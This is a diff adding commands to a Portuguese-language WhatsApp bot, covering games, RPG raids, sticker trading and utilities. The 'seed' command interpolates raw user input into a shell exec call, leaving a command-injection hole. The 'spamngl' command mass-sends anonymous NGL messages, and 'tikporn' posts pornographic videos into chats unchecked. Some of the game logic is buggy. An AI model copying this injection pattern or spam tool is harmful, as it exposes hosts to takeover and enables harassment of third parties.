+    const nomes = [
+      'PAGBANK',
+      'MERCADO PAGO',
+      'SYSTEM ZERO',
+      'BANCO DO BRASIL',
+      'PICPAY',
+      'CHAT GPT',
+      'INTER',
+      'TOKI',
+      'CLARO',
+      'TIM',
+      'CAPS',
+      'BRADESCO',
+      'COPILOT',
+      'HEYPAT',
+      'PERPLEXITY',
+      'HIVEMIND',
+      'TIKTOK PROMOTE',
+      'SANTANDER'
+    ]
+
+    for (let i = 0; i < lista.length; i++) {
+      await conn.sendMessage(
+        from,
+        {
+          text: nomes[i]
+        },
+        {
+          quoted: lista[i]
+        }
+      )
+
+      await new Promise(resolve => setTimeout(resolve, 1000))
+    }
+
+  } catch (e) {
+    console.log('Erro no comando selos:', e)
+  }
+}
+break
+
+case 'rbs': {
+    try {
+        await conn.sendMessage(from, {
+            react: { text: '⌛', key: info.key }
+        })
+
+        const RSM = info.message?.extendedTextMessage?.contextInfo?.quotedMessage
+
+        const sticker =
+            RSM?.stickerMessage ||
+            RSM?.viewOnceMessageV2?.message?.stickerMessage ||
+            RSM?.viewOnceMessage?.message?.stickerMessage
+
+        if (!sticker) {
+            await conn.sendMessage(from, {
+                react: { text: '❌', key: info.key }
+            })
+            return reply('Marque uma figurinha!')
+        }
+
+        // Pegue o texto informado no comando
+        const text = body?.trim() || ''
+
+        const packName = 'WHATSAPP'
+        const authorName = '+55 19 99572-9970'
+
+        const { downloadContentFromMessage } = require('@systemzero/baileys')
+
+        const stream = await downloadContentFromMessage(sticker, 'sticker')
+        let buffer = Buffer.from([])
+
+        for await (const chunk of stream) {
+            buffer = Buffer.concat([buffer, chunk])
+        }
+
+        await conn.sendMessage(from, {
+            sticker: buffer,
+            isAvatar: true,
+            stickerPackName: packName,
+            stickerAuthor: authorName
+        }, { quoted: info })
+
+        await conn.sendMessage(from, {
+            react: { text: '✅', key: info.key }
+        })
+
+    } catch (e) {
+        console.error('[ERRO RBS]', e)
+
+        await conn.sendMessage(from, {
+            react: { text: '❌', key: info.key }
+        })
+
+        reply('Erro ao roubar a figurinha.')
+    }
+}
+break;
+
+case 'seed': {
+try {
+
+if (!q) return reply(`❌ Use:
+${prefix}seed <seed>`)
+
+exec(`${process.env.HOME}/seedfinder ${q}`, async (err, stdout) => {
+
+if (err) {
+console.log(err)
+return reply("❌ Erro ao calcular seed")
+}
+
+await conn.sendMessage(from, {
+text: `🌎 *SEED FINDER BEDROCK*
+
+${stdout}
+
+📱 Versão: Bedrock 1.26
+⚙️ Calculado pelo Cubiomes`,
+footer: NomeBot
+}, { quoted: info })
+
+})
+
+} catch(e) {
+console.log(e)
+reply("❌ Erro")
+}
+
+break;
+}
+
+case 'afk': {
+const motivo = q || 'Sem motivo';
+
+afk[sender] = {
+motivo,
+desde: Date.now()
+};
+
+reply(`💤 Você entrou em modo AFK.\n\n📌 Motivo: ${motivo}`);
+}
+break;
+
+case 'spamngl': {
+try {
+
+if(!q) return reply(`📩 *SPAM NGL*
+
+Use:
+${prefix}spamngl link|quantidade|mensagem
+
+Exemplo:
+${prefix}spamngl https://ngl.link/gzeescriptsdev|5|Gzee`);
+
+
+const axios = require("axios");
+
+let [link, qtd, msg] = q.split("|");
+
+if(!link || !qtd || !msg){
+return reply("❌ Formato inválido.\nUse: link|quantidade|mensagem");
+}
+
+
+await reagir(from,"📩");
+
+
+const { data } = await axios.get(
+`https://zone.api.br/api/v1/spamngl?link=${encodeURIComponent(link)}&qtd=${qtd}&msg=${encodeURIComponent(msg)}`
+);
+
+
+if(!data.status){
+return reply("❌ Falha ao enviar.");
+}
+
+
+reply(`📩 *SPAM NGL*
+
+${data.resultado}
+
+📊 *Detalhes:*
+✅ Enviadas: ${data.detalhes.enviadas}
+❌ Erros: ${data.detalhes.erros}
+📦 Total: ${data.detalhes.total}
+
+⚡ Limite:
+${data.limite}`);
+
+
+}catch(e){
+console.log("ERRO SPAMNGL:", e.response?.data || e);
+reply("❌ Erro ao executar.");
+}
+
+}
+break;
+
+case 'tikporn': {
+try {
+
+if(!q) return reply(`🔎 Use:
+${prefix}tikporn nome`);
+
+const axios = require("axios");
+
+const { data } = await axios.get(
+`https://zone.api.br/api/search/tikporn?apikey=API_KEY_SYSTEM&q=${q}&feed=1&page=1`
+);
+
+
+if(!data.status) return reply("❌ Erro na busca.");
+
+if(!data.videos || data.videos.length === 0){
+return reply(`❌ Nenhum vídeo encontrado para: ${q}`);
+}
+
+
+let resultado = data.videos[0];
+
+
+await conn.sendMessage(from,{
+video:{
+url: resultado.url || resultado.video
+},
+caption:`🔥 *TikPorn Busca*
+
+🔎 Busca: ${data.busca}
+
+📄 Página: ${data.pagina}
+
+🎬 Resultado encontrado`
+},{
+quoted:info
+});
+
+
+} catch(e){
+console.log("ERRO TIKPORN:", e.response?.data || e);
+reply("❌ Erro ao buscar.");
+}
+
+}
+break;
+
+case 'piada': {
+try {
+
+const piadas = [
+"😂 Por que o livro foi ao médico? Porque ele tinha muitas páginas em branco!",
+"🤣 O que o zero disse para o oito? Belo cinto!",
+"😹 Por que o computador foi ao médico? Porque pegou um vírus!",
+"😂 O que o tomate foi fazer no banco? Tirar extrato!",
+"🤣 Por que o celular foi para a escola? Para melhorar a memória!",
+"😆 Qual o café mais perigoso? O ex-presso!",
+"😂 Por que o calendário ficou triste? Porque seus dias estavam contados!",
+"🤣 Por que o lápis foi preso? Porque ele estava apontando!",
+"😂 O que a parede falou para a outra? Nos encontramos na esquina!",
+"😹 Por que o pão foi ao psicólogo? Porque estava com a massa baixa!",
+"🤣 Qual é o rei dos queijos? O reiqueijão!",
+"😂 Por que a bicicleta não consegue ficar em pé sozinha? Porque ela está sempre sem equilíbrio!",
+"😆 O que o pato falou para a pata? Vem quá!",
+"🤣 Por que o relógio foi expulso da escola? Porque ele sempre atrasava!",
+"😂 Qual animal é o mais antigo? A zebra, porque é em preto e branco!",
+"😹 Por que o peixe não gosta de computador? Porque tem medo da rede!",
+"🤣 O que o chão disse para a mesa? Você tem quatro pernas e eu sustento você!",
+"😂 Por que a banana foi ao médico? Porque ela não estava descascando bem!",
+"😆 O que um tijolo falou para o outro? Há algo entre nós!",
+"🤣 Por que o cachorro entrou na igreja? Para assistir ao au-lmoço!",
+"😂 O que a nuvem disse para o céu? Você está sempre acima de mim!",
+"😹 Por que o sorvete brigou com o chocolate? Porque ele derreteu a relação!",
+"🤣 Qual é o cúmulo da paciência? Esperar a espera acabar!",
+"😂 Por que o celular ficou triste? Porque perdeu seus contatos!",
+"😆 O que o milho falou para a pipoca? Você estourou de alegria!",
+"🤣 Por que o computador não dorme? Porque fica cheio de programas!",
+"😂 O que o gato disse quando caiu? Mia culpa!",
+"😹 Por que o astronauta terminou o namoro? Porque precisava de espaço!",
+"🤣 Qual é o animal que sempre sabe a hora? O relógio-cão!",
+"😂 Por que o fantasma é ruim de mentira? Porque todo mundo vê através dele!"
+];
+
+let piada = piadas[Math.floor(Math.random() * piadas.length)];
+
+reply(`🤣 *PIADA DO DIA*
+
+${piada}`);
+
+} catch(e) {
+console.log(e);
+reply("❌ Erro ao pegar piada.");
+}
+}
+break;
+
+case 'dado': {
+try {
+
+let numero = Math.floor(Math.random() * 6) + 1;
+
+let emojis = {
+1: "⚀",
+2: "⚁",
+3: "⚂",
+4: "⚃",
+5: "⚄",
+6: "⚅"
+};
+
+reply(`🎲 *DADO*
+
+Você jogou o dado...
+
+${emojis[numero]} Caiu o número: *${numero}*`);
+
+} catch(e) {
+console.log(e);
+reply("❌ Erro ao jogar o dado.");
+}
+}
+break;
+
+case 'plantar': {
+try {
+
+let banco = JSON.parse(fs.readFileSync(bancoPath));
+
+const user = getUserBancoId(info, sender, isGroup);
+
+if (!banco[user]) banco[user] = { saldo: 0, xp: 0 };
+
+let xp = banco[user].xp || 0;
+
+const plantas = {
+    trigo: {
+        nome: "🌾 Trigo",
+        nivel: 0,
+        tempo: 300000,
+        recompensa: [100, 300]
+    },
+    milho: {
+        nome: "🌽 Milho",
+        nivel: 5,
+        tempo: 600000,
+        recompensa: [300, 600]
+    },
+    tomate: {
+        nome: "🍅 Tomate",
+        nivel: 10,
+        tempo: 900000,
+        recompensa: [600, 1000]
+    },
+    morango: {
+        nome: "🍓 Morango",
+        nivel: 20,
+        tempo: 1200000,
+        recompensa: [1000, 2000]
+    },
+    ouro: {
+        nome: "🌳 Árvore de Ouro",
+        nivel: 50,
+        tempo: 1800000,
+        recompensa: [3000, 6000]
+    }
+};
+
+let escolha = args[0]?.toLowerCase();
+
+if (!escolha) {
+return reply(`🌱 *PLANTAÇÕES*
+
+${Object.keys(plantas).map(p => 
+`• ${p} - Nível ${plantas[p].nivel} XP`
+).join("\n")}
+
+Use:
+${prefix}plantar <planta>`);
+}
+
+if (!plantas[escolha]) {
+return reply("❌ Essa planta não existe.");
+}
+
+if (xp < plantas[escolha].nivel) {
+return reply(`❌ Você precisa de nível ${plantas[escolha].nivel} XP para plantar ${plantas[escolha].nome}`);
+}
+
+if (banco[user].plantacao) {
+return reply("🌱 Você já tem uma planta crescendo!\nUse .colher quando estiver pronta.");
+}
+
+banco[user].plantacao = {
+    planta: plantas[escolha].nome,
+    recompensa: plantas[escolha].recompensa,
+    tempo: Date.now() + plantas[escolha].tempo
+};
+
+fs.writeFileSync(bancoPath, JSON.stringify(banco, null, 2));
+
+reply(`🌱 *Plantado com sucesso!*
+
+Você plantou: ${plantas[escolha].nome}
+
+⏳ Tempo: ${plantas[escolha].tempo / 60000} minutos
+
+Use:
+${prefix}colher
+quando crescer.`);
+
+} catch(e) {
+console.log(e);
+reply("❌ Erro ao plantar.");
+}
+}
+break;
+
+
+case 'colher': {
+try {
+
+let banco = JSON.parse(fs.readFileSync(bancoPath));
+
+const user = getUserBancoId(info, sender, isGroup);
+
+if (!banco[user]?.plantacao) {
+return reply(`❌ Você não tem plantação.
+
+Use:
+${prefix}plantar`);
+}
+
+let planta = banco[user].plantacao;
+
+if (Date.now() < planta.tempo) {
+let falta = Math.ceil((planta.tempo - Date.now()) / 60000);
+
+return reply(`🌱 ${planta.planta} ainda está crescendo!
+
+⏳ Falta: ${falta} minutos`);
+}
+
+let ganho = Math.floor(
+Math.random() * (planta.recompensa[1] - planta.recompensa[0])
+) + planta.recompensa[0];
+
+banco[user].saldo = (banco[user].saldo || 0) + ganho;
+banco[user].xp = (banco[user].xp || 0) + 20;
+
+banco[user].plantacao = null;
+
+fs.writeFileSync(bancoPath, JSON.stringify(banco, null, 2));
+
+reply(`🌾 *Colheita realizada!*
+
+Você colheu: ${planta.planta}
+
+💰 Ganhou: ${ganho}
+⭐ XP: +20`);
+
+} catch(e) {
+console.log(e);
+reply("❌ Erro ao colher.");
+}
+}
+break;
+
+case 'lerqr': {
+try {
+
+await reagir(from, "⏳");
+
+const { downloadMediaMessage } = require("@systemzero/baileys");
+const QrCode = require("qrcode-reader");
+const Jimp = require("jimp");
+
+const quoted = info.message?.extendedTextMessage?.contextInfo?.quotedMessage;
+
+if (!quoted?.imageMessage) {
+    return reply("❌ Responda uma imagem com QR Code.");
+}
+
+const msg = {
+    message: quoted
+};
+
+const buffer = await downloadMediaMessage(
+    msg,
+    "buffer",
+    {},
+    {
+        logger
+    }
+);
+
+const image = await Jimp.read(buffer);
+
+const qr = new QrCode();
+
+const texto = await new Promise((resolve, reject) => {
+
+    qr.callback = (err, value) => {
+        if (err) return reject(err);
+        resolve(value?.result);
+    };
+
+    qr.decode(image.bitmap);
+
+});
+
+if (!texto) {
+    return reply("❌ Não encontrei nenhum QR Code nessa imagem.");
+}
+
+await conn.sendMessage(
+    from,
+    {
+        text:
+`📱 *QR CODE LIDO*
+
+🔗 Resultado:
+${texto}`
+    },
+    {
+        quoted: m
+    }
+);
+
+await reagir(from, "✅");
+
+
+} catch (e) {
+
+console.error("[LERQR]", e);
+
+await reagir(from, "❌");
+
+reply(
+`❌ Erro ao ler QR Code.\n\n${e.message || e}`
+);
+
+}
+}
+break;
+
+case 'encurta':
+case 'short':
+case 'shorturl': {
+try {
+
+if (!q) {
+return reply(`🔗 *ENCURTAR LINK*
+
+Use:
+${prefix + command} https://exemplo.com`);
+}
+
+const axios = require("axios");
+
+await reagir(from, "⏳");
+
+const url = q.trim();
+
+if (!/^https?:\/\//i.test(url)) {
+await reagir(from, "❌");
+return reply("❌ Envie um link válido começando com http:// ou https://");
+}
+
+const { data } = await axios.get(
+`https://is.gd/create.php?format=simple&url=${encodeURIComponent(url)}`,
 {
-headers: formData.getHeaders()
+timeout: 15000
 }
 );
 
-const resultado = data?.[0]?.symbol?.[0]?.data;
-
-if (!resultado) {
-return reply('❌ Nenhum QR Code encontrado na imagem.');
+if (!data || !data.startsWith("https://")) {
+throw new Error(data);
 }
 
-reply(`
-📱 *QR CODE ENCONTRADO*
+await conn.sendMessage(
+from,
+{
+text: `🔗 *LINK ENCURTADO*
 
-📝 Conteúdo:
+📎 Original:
+${url}
+
+✂️ Novo link:
+${data.trim()}`
+},
+{
+quoted: m
+}
+);
+
+await reagir(from, "✅");
+
+} catch (e) {
+
+console.error("[ENCURTA]", e.message);
+
+await reagir(from, "❌");
+
+if (e.message.includes("blacklist")) {
+return reply(
+`❌ *Link bloqueado*
+
+O is.gd recusou esse endereço por segurança.
+
+Tente usar outro domínio ou outro link.`
+);
+}
+
+reply(`❌ Erro ao encurtar:\n${e.message}`);
+
+}
+}
+break;
+
+case 'escolher': {
+try {
+
+const classe = q.toLowerCase().trim();
+
+if(!classe) return reply(
+`❌ Escolha uma classe.
+
+Exemplo:
+${prefix}escolher guerreiro`
+);
+
+
+if(!classesRPG[classe]) {
+
+return reply(
+`❌ Classe inválida.
+
+Classes disponíveis:
+
+⚔️ guerreiro
+🏹 arqueiro
+🧙 mago
+🛡️ paladino
+🗡️ assassino`
+);
+
+}
+
+
+// banco
+
+const bancoPath = './database/banco.json';
+
+if(!fs.existsSync(bancoPath)){
+fs.writeFileSync(bancoPath,'{}');
+}
+
+
+let banco = JSON.parse(
+fs.readFileSync(bancoPath)
+);
+
+
+const id = sender;
+
+
+if(!banco[id]){
+
+banco[id] = {
+saldo:0,
+xp:0,
+nivel:1,
+inventario:{}
+};
+
+}
+
+
+// cria RPG
+
+salvarClasse(
+banco[id],
+classe
+);
+
+
+// salva
+
+fs.writeFileSync(
+bancoPath,
+JSON.stringify(banco,null,2)
+);
+
+
+
+const c = classesRPG[classe];
+
+
+await conn.sendMessage(from,{
+text:
+`╔═══━━ ⚔️ RPG INICIADO ⚔️ ━━═══╗
+
+🎉 Classe escolhida!
+
+${c.nome}
+
+📜 Descrição:
+${c.descricao}
+
+━━━━━━━━━━━━━━
+
+❤️ HP:
+${c.hp}
+
+⚔️ ATK:
+${c.atk}
+
+🛡️ DEF:
+${c.def}
+
+💥 CRIT:
+${c.crit}%
+
+━━━━━━━━━━━━━━
+
+🚀 Sua aventura começou!
+
+╚═══━━ 🔥 Zyron RPG 🔥 ━━═══╝`,
+mentions:[sender]
+},
+{
+quoted:selo
+});
+
+
+} catch(e){
+
+console.log("ERRO ESCOLHER:",e);
+reply("❌ Erro ao escolher classe.");
+
+}
+
+}
+break;
+
+case 'classes': {
+try {
+
+await reagir(from, "⚔️");
+
+const classes = [
+{
+id:"guerreiro",
+nome:"⚔️ Guerreiro",
+img:"https://files.catbox.moe/az2dq7.jpg",
+desc:
+`🛡️ Classe equilibrada
+
+❤️ HP: 150
+⚔️ ATK: 25
+🛡️ DEF: 15
+💥 CRIT: 5%`
+},
+
+{
+id:"arqueiro",
+nome:"🏹 Arqueiro",
+img:"https://files.catbox.moe/5g27of.jpg",
+desc:
+`🎯 Especialista em críticos
+
+❤️ HP: 120
+⚔️ ATK: 22
+🛡️ DEF: 10
+💥 CRIT: 15%`
+},
+
+{
+id:"mago",
+nome:"🧙 Mago",
+img:"https://files.catbox.moe/q2tevd.jpg",
+desc:
+`✨ Mestre da magia
+
+❤️ HP: 100
+⚔️ ATK: 35
+🛡️ DEF: 8
+💥 CRIT: 10%`
+},
+
+{
+id:"paladino",
+nome:"🛡️ Paladino",
+img:"https://files.catbox.moe/zbw5nb.jpg",
+desc:
+`🛡️ Defensor supremo
+
+❤️ HP: 180
+⚔️ ATK: 18
+🛡️ DEF: 25
+💥 CRIT: 3%`
+},
+
+{
+id:"assassino",
+nome:"🗡️ Assassino",
+img:"https://files.catbox.moe/zut710.jpg",
+desc:
+`💀 Mestre dos críticos
+
+❤️ HP: 110
+⚔️ ATK: 28
+🛡️ DEF: 8
+💥 CRIT: 25%`
+}
+
+];
+
+
+const cards = [];
+
+
+for(const c of classes){
+
+const media = await prepareWAMessageMedia(
+{
+image: {
+url: c.img
+}
+},
+{
+upload: conn.waUploadToServer
+}
+);
+
+
+
+cards.push({
+
+header:{
+title:c.nome,
+hasMediaAttachment:true,
+imageMessage:media.imageMessage
+},
+
+body:{
+text:c.desc
+},
+
+nativeFlowMessage:{
+buttons:[
+{
+name:"quick_reply",
+buttonParamsJson:JSON.stringify({
+
+display_text:`Escolher ${c.nome}`,
+
+id:`${prefix}escolher ${c.id}`
+
+})
+}
+]
+}
+
+});
+
+}
+
+
+
+const msg = generateWAMessageFromContent(from,{
+
+viewOnceMessage:{
+message:{
+interactiveMessage:{
+
+header:{
+title:"🎮 Escolha seu personagem"
+},
+
+body:{
+text:"⚔️ Cada classe possui habilidades únicas!"
+},
+
+footer:{
+text:"🔥 Zyron RPG"
+},
+
+carouselMessage:{
+cards
+}
+
+}
+}
+}
+
+},{userJid:conn.user.id});
+
+
+
+await conn.relayMessage(
+from,
+msg.message,
+{
+messageId:msg.key.id
+}
+);
+
+
+await reagir(from,"✅");
+
+
+} catch(e){
+
+console.log("ERRO CLASSE:",e);
+await reagir(from,"❌");
+reply("❌ Erro ao carregar classes.");
+
+}
+
+}
+break;
+
+case 'raid': {
+try {
+
+if (!isGroup)
+return reply("❌ A raid só pode ser iniciada em grupos.");
+
+if (global.raids[from])
+return reply("⚔️ Já existe uma raid acontecendo nesse grupo.");
+
+const boss = bossesRaid[
+Math.floor(Math.random() * bossesRaid.length)
+];
+
+const bosses = [
+{ nome: '🐉 Dragão Ancestral', vida: 5000, poder: 90, premio: 3500, xp: 450 },
+{ nome: '👹 Demônio Infernal', vida: 7000, poder: 120, premio: 5000, xp: 650 },
+{ nome: '🧟 Rei Zumbi', vida: 4000, poder: 70, premio: 2500, xp: 350 },
+{ nome: '🦇 Vampiro Sombrio', vida: 4500, poder: 85, premio: 3000, xp: 400 },
+{ nome: '💀 Caveira Titã', vida: 6000, poder: 110, premio: 4500, xp: 550 }
+];
+
+global.raids[from] = {
+
+boss: {
+nome: boss.nome,
+hp: boss.hp,
+hpMax: boss.hp,
+atk: boss.atk,
+premio: boss.premio,
+xp: boss.xp
+},
+
+jogadores: {},
+
+estado: "entrando",
+
+criador: sender,
+
+inicio: Date.now()
+
+};
+
+
+await conn.sendMessage(from,{
+text:
+`
+╔═══━━━ ⚔️ RAID RPG ⚔️ ━━━═══╗
+
+👹 Um novo boss apareceu!
+
+${boss.nome}
+
+❤️ Vida:
+${barraHP(boss.hp,boss.hp)}
+${boss.hp}/${boss.hp}
+
+⚔️ Ataque:
+${boss.atk}
+
+💰 Recompensa:
+$${boss.premio}
+
+⭐ XP:
+${boss.xp}
+
+━━━━━━━━━━━━━━
+
+👥 Digite:
+${prefix}entrar
+
+para participar!
+
+⏳ A batalha começa em 30 segundos.
+
+╚══════════════════╝
+`
+},{quoted:selo});
+
+
+// inicia contagem
+
+setTimeout(async()=>{
+
+if(!global.raids[from]) return;
+
+const raid = global.raids[from];
+
+if(Object.keys(raid.jogadores).length < 1){
+
+delete global.raids[from];
+
+return conn.sendMessage(from,{
+text:"❌ Ninguém entrou na raid. Cancelada."
+});
+
+}
+
+
+raid.estado="batalha";
+
+
+await conn.sendMessage(from,{
+text:
+`
+⚔️ RAID INICIADA!
+
+👹 ${raid.boss.nome}
+
+❤️ Vida:
+${barraHP(
+raid.boss.hp,
+raid.boss.hpMax
+)}
+
+Jogadores:
+${Object.keys(raid.jogadores)
+.map(x=>"• @"+x.split("@")[0])
+.join("\n")}
+
+Use:
+⚔️ ${prefix}atacar
+
+Boa sorte!
+`,
+mentions:Object.keys(raid.jogadores)
+});
+
+},30000);
+
+
+} catch(e){
+
+console.log(e);
+
+reply("❌ Erro ao iniciar raid.");
+
+}
+
+}
+break
+
+// ===============================
+// ENTRAR NA RAID
+// ===============================
+
+case 'entrar': {
+try {
+
+if(!isGroup)
+return reply("❌ Só funciona em grupo.");
+
+const raid = global.raids[from];
+
+if(!raid)
+return reply("❌ Não existe nenhuma raid ativa.");
+
+if(raid.estado !== "entrando")
+return reply("⚔️ A raid já começou.");
+
+const id = sender.split("@")[0];
+
+
+if(raid.jogadores[id])
+return reply("⚠️ Você já entrou na raid.");
+
+
+if(!global.banco) global.banco = {};
+
+
+if(!global.banco[id]){
+
+global.banco[id] = {
+
+saldo:0,
+xp:0,
+nivel:1,
+
+atk:50,
+def:30,
+hp:1000,
+
+vitorias:0,
+derrotas:0,
+
+inventario:{}
+
+};
+
+}
+
+
+let player = global.banco[id];
+
+
+raid.jogadores[id] = {
+
+hp: player.hp || 1000,
+
+hpMax: player.hp || 1000,
+
+atk: player.atk || 50,
+
+def: player.def || 30,
+
+dano:0
+
+};
+
+
+await conn.sendMessage(from,{
+text:
+`
+⚔️ *GUERREIRO ENTROU NA RAID*
+
+👤 @${id}
+
+❤️ Vida:
+${player.hp}
+
+⚔️ Ataque:
+${player.atk}
+
+🛡️ Defesa:
+${player.def}
+
+👥 Total:
+${Object.keys(raid.jogadores).length}
+`,
+mentions:[sender]
+});
+
+
+} catch(e){
+
+console.log(e);
+reply("❌ Erro ao entrar na raid.");
+
+}
+
+}
+break;
+
+
+
+// ===============================
+// ATACAR BOSS
+// ===============================
+
+case 'atacar': {
+
+try {
+
+const raid = global.raids[from];
+
+if(!raid)
+return reply("❌ Não existe raid ativa.");
+
+if(raid.estado !== "batalha")
+return reply("⏳ A batalha ainda não começou.");
+
+
+const id = sender.split("@")[0];
+
+
+const player = raid.jogadores[id];
+
+
+if(!player)
+return reply("❌ Você não está participando da raid.");
+
+
+// dano base
+
+let dano = Math.floor(
+Math.random() * player.atk
+) + player.atk;
+
+
+// crítico
+
+let critico = false;
+
+
+if(Math.random() <= 0.15){
+
+dano *= 2;
+critico=true;
+
+}
+
+
+// tira vida do boss
+
+raid.boss.hp -= dano;
+
+if(raid.boss.hp < 0)
+raid.boss.hp = 0;
+
+
+player.dano += dano;
+
+
+
+let msg =
+`
+⚔️ *ATAQUE*
+
+👤 @${id}
+
+💥 Dano causado:
+${dano}
+`;
+
+
+if(critico){
+
+msg += `
+🔥 CRÍTICO!
+`;
+
+}
+
+
+
+msg += `
+
+👹 ${raid.boss.nome}
+
+❤️ Vida:
+
+${barraHP(
+raid.boss.hp,
+raid.boss.hpMax
+)}
+
+${raid.boss.hp}/${raid.boss.hpMax}
+`;
+
+
+
+await conn.sendMessage(from,{
+text:msg,
+mentions:[sender]
+});
+
+
+// verifica vitória
+
+raid.boss.hp -= dano;
+
+if(raid.boss.hp < 0)
+raid.boss.hp = 0;
+
+
+player.dano += dano;
+
+
+// verifica se o boss morreu
+
+if(raid.boss.hp <= 0){
+
+await finalizarRaid(from, conn);
+
+return;
+
+}
+
+
+
+} catch(e){
+
+console.log(e);
+
+reply("❌ Erro no ataque.");
+
+}
+
+}
+break;
+
+// ===============================
+// DEFENDER
+// ===============================
+
+case 'defender': {
+
+try {
+
+const raid = global.raids[from];
+
+if(!raid)
+return reply("❌ Não existe raid ativa.");
+
+if(raid.estado !== "batalha")
+return reply("⏳ A batalha ainda não começou.");
+
+const id = sender.split("@")[0];
+
+const player = raid.jogadores[id];
+
+
+if(!player)
+return reply("❌ Você não está na raid.");
+
+player.defendendo = true;
+
+
+await conn.sendMessage(from,{
+text:
+`
+🛡️ *DEFESA ATIVADA*
+
+👤 @${id}
+
+Você irá receber menos dano no próximo ataque do boss.
+`,
+mentions:[sender]
+});
+
+
+// boss ataca depois
+
+await ataqueBoss(from, conn);
+
+
+} catch(e){
+
+console.log(e);
+
+}
+
+}
+
+break;
+
+
+
+// ===============================
+// CURAR
+// ===============================
+
+case 'cura': {
+
+try {
+
+const raid = global.raids[from];
+
+if(!raid)
+return reply("❌ Não existe raid.");
+
+const id = sender.split("@")[0];
+
+const player = raid.jogadores[id];
+
+
+if(!player)
+return reply("❌ Você não está na raid.");
+
+
+
+let cura = Math.floor(
+Math.random()*300
+)+200;
+
+
+player.hp += cura;
+
+
+if(player.hp > player.hpMax)
+player.hp = player.hpMax;
+
+
+
+await conn.sendMessage(from,{
+text:
+`
+❤️ *CURA*
+
+👤 @${id}
+
+Recuperou:
++${cura} HP
+
+Vida:
+${player.hp}/${player.hpMax}
+`,
+mentions:[sender]
+});
+
+
+await ataqueBoss(from,conn);
+
+
+
+} catch(e){
+
+console.log(e);
+
+}
+
+}
+
+break;
+
+case 'venderfig': {
+try {
+
+let banco = JSON.parse(fs.readFileSync(bancoPath));
+
+const user = getUserBancoId(info, sender, isGroup);
+
+
+const idFig = Number(args[0]);
+
+
+if (!idFig) {
+return reply(`❌ Informe o ID da figurinha.
+
+Exemplo:
+${prefix}venderfig 15`);
+}
+
+
+if (!banco[user]?.album?.repetidas[idFig]) {
+return reply("❌ Você não possui essa figurinha repetida.");
+}
+
+
+const quantidade = banco[user].album.repetidas[idFig];
+
+
+const fig = figurinhas.find(
+f => f.id == idFig
+);
+
+
+if (!fig) {
+return reply("❌ Figurinha não encontrada.");
+}
+
+
+// Valor pela raridade
+
+let valor = 0;
+
+
+switch(fig.raridade) {
+
+case 'comum':
+valor = 150;
+break;
+
+case 'rara':
+valor = 500;
+break;
+
+case 'epica':
+valor = 2000;
+break;
+
+case 'lendaria':
+valor = 10000;
+break;
+
+default:
+valor = 100;
+}
+
+
+// Vende somente uma unidade
+
+banco[user].album.repetidas[idFig]--;
+
+if (banco[user].album.repetidas[idFig] <= 0) {
+delete banco[user].album.repetidas[idFig];
+}
+
+
+banco[user].saldo += valor;
+
+
+fs.writeFileSync(
+bancoPath,
+JSON.stringify(banco,null,2)
+);
+
+
+reply(`╭━━━〔 💰 𝐕𝐄𝐍𝐃𝐀 𝐃𝐄 𝐅𝐈𝐆𝐔𝐑𝐈𝐍𝐇𝐀 〕━━━⬣
+┃
+┃ 🃏 ${fig.nome}
+┃ 🌎 ${fig.pais}
+┃ ⭐ ${fig.raridade}
+┃
+┃ 💵 Valor recebido:
+┃ +$${valor}
+┃
+┃ 🏦 Saldo atual:
+┃ $${banco[user].saldo}
+┃
+╰━━━〔 ❤️‍🔥 𝐙𝐘𝐑𝐎𝐍-𝐌𝐃 〕━━━⬣`);
+
+
+} catch(e){
+
+console.log(e);
+reply("❌ Erro ao vender figurinha.");
+
+}
+
+}
+break;
+
+case 'recusar': {
+try {
+
+const trocaPath = './database/trocas.json';
+
+if (!fs.existsSync(trocaPath)) {
+return reply("❌ Não existe nenhuma troca pendente.");
+}
+
+let trocas = JSON.parse(fs.readFileSync(trocaPath));
+
+
+let chave = Object.keys(trocas).find(
+x => trocas[x].para == sender
+);
+
+
+if (!chave) {
+return reply("❌ Você não possui nenhuma troca pendente.");
+}
+
+
+delete trocas[chave];
+
+
+fs.writeFileSync(
+trocaPath,
+JSON.stringify(trocas,null,2)
+);
+
+
+reply(`╭━━━〔 ❌ 𝐓𝐑𝐎𝐂𝐀 𝐑𝐄𝐂𝐔𝐒𝐀𝐃𝐀 〕━━━⬣
+┃
+┃ A troca foi cancelada.
+┃
+┃ Nenhuma figurinha foi alterada.
+┃
+╰━━━〔 ❤️‍🔥 𝐙𝐘𝐑𝐎𝐍-𝐌𝐃 〕━━━⬣`);
+
+
+} catch(e){
+
+console.log(e);
+reply("❌ Erro ao recusar troca.");
+
+}
+
+}
+break;
+
+case 'aceitar': {
+try {
+const trocaPath = './database/trocas.json';
+
+if (!fs.existsSync(trocaPath)) {
+return reply("❌ Não existe nenhuma troca pendente.");
+}
+
+let banco = JSON.parse(fs.readFileSync(bancoPath));
+let trocas = JSON.parse(fs.readFileSync(trocaPath));
+
+
+const user = getUserBancoId(info, sender, isGroup);
+
+
+// Procura uma troca destinada a você
+
+let chave = Object.keys(trocas).find(
+x => trocas[x].para == sender
+);
+
+
+if (!chave) {
+return reply("❌ Você não possui nenhuma troca pendente.");
+}
+
+
+const troca = trocas[chave];
+
+
+const jogador1 = chave;
+const jogador2 = sender;
+
+
+if (!banco[jogador1]?.album || !banco[jogador2]?.album) {
+return reply("❌ Usuário sem álbum.");
+}
+
+
+// Verifica novamente
+
+if (!banco[jogador1].album.colecao.includes(troca.de)) {
+return reply("❌ O jogador não possui mais essa figurinha.");
+}
+
+if (!banco[jogador2].album.colecao.includes(troca.receber)) {
+return reply("❌ Você não possui mais essa figurinha.");
+}
+
+
+// Faz a troca
+
+banco[jogador1].album.colecao =
+banco[jogador1].album.colecao.filter(
+id => id != troca.de
+);
+
+banco[jogador2].album.colecao =
+banco[jogador2].album.colecao.filter(
+id => id != troca.receber
+);
+
+
+// Adiciona
+
+banco[jogador1].album.colecao.push(troca.receber);
+
+banco[jogador2].album.colecao.push(troca.de);
+
+
+// Remove troca
+
+delete trocas[chave];
+
+
+fs.writeFileSync(
+bancoPath,
+JSON.stringify(banco,null,2)
+);
+
+fs.writeFileSync(
+trocaPath,
+JSON.stringify(trocas,null,2)
+);
+
+
+reply(`╭━━━〔 ✅ 𝐓𝐑𝐎𝐂𝐀 𝐑𝐄𝐀𝐋𝐈𝐙𝐀𝐃𝐀 〕━━━⬣
+┃
+┃ 🤝 A troca foi concluída!
+┃
+┃ 📦 As figurinhas foram trocadas com sucesso.
+┃
